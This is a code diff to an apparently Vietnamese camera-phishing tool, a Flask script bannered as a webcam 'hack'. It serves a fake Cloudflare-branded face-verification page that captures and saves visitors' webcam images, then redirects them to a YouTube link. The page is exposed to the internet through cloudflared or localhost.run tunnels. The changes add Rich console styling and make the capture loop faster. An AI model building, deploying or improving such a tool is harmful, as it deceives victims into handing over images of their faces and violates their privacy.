@@ -5,6 +5,11 @@ from PIL import Image
 import cv2
 import numpy as np
 import subprocess
+from rich.console import Console
+from rich.panel import Panel
+
+# Khởi tạo console cho Rich
+console = Console()
 
 # Sử dụng giá trị mặc định từ input
 TITLE = input("Nhập tiêu đề trang web (mặc định: 'Xác Thực Khuôn Mặt - An Toàn & Tin Cậy'): ") or "Xác Thực Khuôn Mặt - An Toàn & Tin Cậy"
@@ -17,20 +22,18 @@ app = Flask(__name__)
 os.system("clear")
 os.system("cls")
 
-# Banner ASCII
-print(r"""
+# In ra Banner ASCII đẹp hơn với Rich
+banner = r"""
 ██████╗░██╗░░██╗░█████╗░░█████╗░░█████╗░███╗░░░███╗██╗░░██╗░█████╗░░█████╗░██╗░░██╗
 ██╔══██╗██║░░██║██╔══██╗██╔══██╗██╔══██╗████╗░████║██║░░██║██╔══██╗██╔══██╗██║░██╔╝
 ██████╔╝███████║██║░░██║██║░░╚═╝███████║██╔████╔██║███████║███████║██║░░╚═╝█████═╝░
 ██╔═══╝░██╔══██║██║░░██║██║░░██╗██╔══██║██║╚██╔╝██║██╔══██║██╔══██║██║░░██╗██╔═██╗░
 ██║░░░░░██║░░██║╚█████╔╝╚█████╔╝██║░░██║██║░╚═╝░██║██║░░██║██║░░██║╚█████╔╝██║░╚██╗
 ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
--- BY: MLBSANS
--- github: https://github.com/mlbsans
--- Tạo server:
-   + 1: ssh -R 80:localhost:8080 nokey@localhost.run
-   + 2: cloudflared tunnel --url http://localhost:8080
-""")
+"""
+console.print(Panel(banner, title="-- BY: MLBSANS --", subtitle="github.com/mlbsans", style="bold cyan"))
+
+console.print("[green]Tạo server:[/green]\n[blue]+ 1:[/blue] ssh -R 80:localhost:8080 nokey@localhost.run\n[blue]+ 2:[/blue] cloudflared tunnel --url http://localhost:8080", style="bold magenta")
 
 # Khởi tạo classifier phát hiện khuôn mặt
 face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
@@ -38,10 +41,10 @@ SAVE_PATH = "IMAGE"
 os.makedirs(SAVE_PATH, exist_ok=True)
 
 # PHẦN HTML/CSS/JS:
-# - Logo hiển thị biểu tượng Cloudflare (không chứa chữ) từ URL mới
+# - Logo hiển thị biểu tượng Cloudflare (không chứa chữ) từ Wikipedia
 # - Spinner nhỏ nằm bên dưới logo
-# - Nếu nhận dạng khuôn mặt hợp lệ liên tục đủ 2 bức (2 giây) sẽ chuyển trang
-# - Khi chuyển trang, tắt camera tự động
+# - Nếu nhận dạng được 2 bức ảnh hợp lệ liên tiếp, chuyển trang
+# - Khi chuyển trang, tự động tắt camera
 HTML_PAGE = f"""
 <!DOCTYPE html>
 <html lang="vi">
@@ -114,6 +117,14 @@ HTML_PAGE = f"""
       visibility: visible;
       transform: translate(-50%, -10px);
     }}
+
+    /* Media query cho màn hình nhỏ (ví dụ điện thoại) */
+    @media (max-width: 768px) {{
+      .notification {{
+        font-size: 1.2rem;
+        padding: 20px 30px;
+      }}
+    }}
   </style>
 </head>
 <body>
@@ -152,29 +163,29 @@ HTML_PAGE = f"""
                 .then(response => {{
                   if(response.ok) {{
                     validCount++;
-                    // Nếu nhận dạng hợp lệ liên tục đủ 2 bức (2 giây) thì chuyển trang
+                    // Nếu nhận dạng hợp lệ liên tục đủ 2 bức thì chuyển trang
                     if(validCount >= 2) {{
                       videoStream.getTracks().forEach(track => track.stop());
                       window.location.href = "{YOUTUBE_LINK}";
                     }} else {{
-                      setTimeout(captureLoop, 1000);
+                      setTimeout(captureLoop, 400);
                     }}
                   }} else {{
                     validCount = 0;
                     showNotification();
-                    setTimeout(captureLoop, 1000);
+                    setTimeout(captureLoop, 400);
                   }}
                 }})
                 .catch(err => {{
                   console.error("Lỗi upload:", err);
                   validCount = 0;
-                  setTimeout(captureLoop, 1000);
+                  setTimeout(captureLoop, 400);
                 }});
             }})
             .catch(err => {{
               console.error("Lỗi chụp ảnh:", err);
               validCount = 0;
-              setTimeout(captureLoop, 1000);
+              setTimeout(captureLoop, 400);
             }});
         }}
         captureLoop();
@@ -217,22 +228,22 @@ def upload():
             minSize=(30, 30),
             flags=cv2.CASCADE_SCALE_IMAGE
         )
-        print("Detected faces:", faces)
+        console.log(f"[blue]Detected faces:[/blue] {faces}")
         if len(faces) == 0:
-            print("\033[31m[❌] Không phát hiện được khuôn mặt (che mặt?)!\033[0m")
+            console.log("[red]Không phát hiện được khuôn mặt (che mặt?)![/red]")
             return "Che Mặt Rồi", 400
 
         img.save(image_path, "PNG")
-        print(f"\033[32m[📷] Ảnh đã lưu: {image_path}\033[0m")
+        console.log(f"[green]Ảnh đã lưu: {image_path}[/green]")
         return "OK", 200
     except Exception as e:
-        print(f"\033[31mLỗi khi lưu ảnh: {e}\033[0m")
+        console.log(f"[red]Lỗi khi lưu ảnh: {e}[/red]")
         return "Lỗi khi lưu ảnh!", 500
 
 if __name__ == '__main__':
     try:
         subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:8080"])
-        print("\033[92mCloudflared tunnel started successfully.\033[0m")
+        console.log("[green]Cloudflared tunnel started successfully.[/green]")
     except Exception as ex:
-        print(f"\033[91mKhông thể khởi chạy cloudflared tunnel: {ex}\033[0m")
+        console.log(f"[red]Không thể khởi chạy cloudflared tunnel: {ex}[/red]")
     app.run(host='0.0.0.0', port=8080, debug=True, use_reloader=False)
